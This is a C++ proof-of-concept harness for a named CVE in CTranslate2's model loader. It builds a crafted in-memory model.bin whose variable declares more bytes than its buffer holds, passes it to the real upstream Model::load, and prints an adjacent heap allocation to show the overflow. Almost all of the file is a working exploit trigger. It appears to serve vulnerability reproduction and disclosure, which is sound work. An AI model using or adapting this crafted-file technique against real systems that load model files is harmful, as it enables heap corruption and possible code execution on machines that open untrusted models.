// Real-source consumer for CVE-2026-102566.
// Compiles the verbatim upstream v4.8.0 src/models/model.cc and real
// StorageView/allocator. Only logging and the model factory are stubbed;
// Model::load itself and the vulnerable consume<char> call are upstream code.
#include <cstdint>
#include <cstdlib>
#include <iostream>
#include <memory>
#include <sstream>
#include <string>

#include <nlohmann/json.hpp>

#include "ctranslate2/devices.h"
#include "ctranslate2/models/model.h"
#include "ctranslate2/models/model_factory.h"
#include "ctranslate2/models/model_reader.h"
#include "ctranslate2/storage_view.h"
#include "ctranslate2/types.h"
#include "ctranslate2/utils.h"

using namespace ctranslate2;
using namespace ctranslate2::models;

namespace {
  class MiniModel : public Model {
  public:
    std::unique_ptr<Model> clone() const override { return std::make_unique<MiniModel>(); }
  };

  std::string crafted_model(size_t attack_bytes) {
    std::string b;
    auto u8 = [&](uint8_t v) { b.push_back(static_cast<char>(v)); };
    auto u16 = [&](uint16_t v) { u8(v & 0xff); u8(v >> 8); };
    auto u32 = [&](uint32_t v) { u8(v & 0xff); u8((v >> 8) & 0xff); u8((v >> 16) & 0xff); u8(v >> 24); };
    auto str = [&](const std::string& s) { u16(static_cast<uint16_t>(s.size() + 1)); b += s; u8(0); };

    u32(6);                    // binary_version (current_binary_version = 6)
    str("Transformer");        // spec
    u32(1);                    // spec revision
    u32(2);                    // num_variables

    // Variable 0: shape {2,2} FLOAT32 => 16-byte real StorageView buffer.
    str("origin");
    u8(2);                     // rank
    u32(2); u32(2);            // dimensions
    u8(static_cast<uint8_t>(DataType::FLOAT32));
    u32(static_cast<uint32_t>(attack_bytes));  // file-derived num_bytes (no capacity check)
    for (size_t i = 0; i < attack_bytes; ++i)
      u8(static_cast<uint8_t>('A' + (i % 26)));

    // Variable 1: a second real allocation following the first.
    str("victim");
    u8(2);
    u32(2); u32(2);
    u8(static_cast<uint8_t>(DataType::FLOAT32));
    u32(16);
    for (size_t i = 0; i < 16; ++i)
      u8(static_cast<uint8_t>('V'));

    u32(0);                    // num_aliases
    return b;
  }

  class MemReader : public ModelReader {
  public:
    explicit MemReader(std::string model) : _model(std::move(model)) {}
    std::string get_model_id() const override { return "mem://crafted"; }
    std::unique_ptr<std::istream> get_file(const std::string& filename,
                                           const bool) override {
      if (filename == "model.bin")
        return std::make_unique<std::istringstream>(_model);
      return nullptr;          // no config.json; model->config stays empty
    }
  private:
    std::string _model;
  };
}

namespace ctranslate2 {
  namespace models {
    std::shared_ptr<Model> create_model(const std::string&) {
      return std::make_shared<MiniModel>();
    }
  }
  // model.cc only needs this for one-time logging; the shim keeps the link light.
  void log_system_config() {}
}

int main(int argc, char** argv) {
  const size_t attack_bytes = argc > 1 ? std::strtoul(argv[1], nullptr, 10) : 17;
  MemReader reader(crafted_model(attack_bytes));
  std::cout << "CT2 real-source consumer: attack num_bytes=" << attack_bytes << std::endl;
  auto model = Model::load(reader, Device::CPU, 0);
  std::cout << "load returned; variables=" << model->get_variables().size() << std::endl;
  const auto& victim = model->get_variable("victim");
  const auto* p = static_cast<const char*>(victim.buffer());
  std::cout << "victim[0:16]=";
  for (size_t i = 0; i < 16; ++i)
    std::cout << (p[i] >= 32 && p[i] < 127 ? p[i] : '.');
  std::cout << std::endl;
  return 0;
}
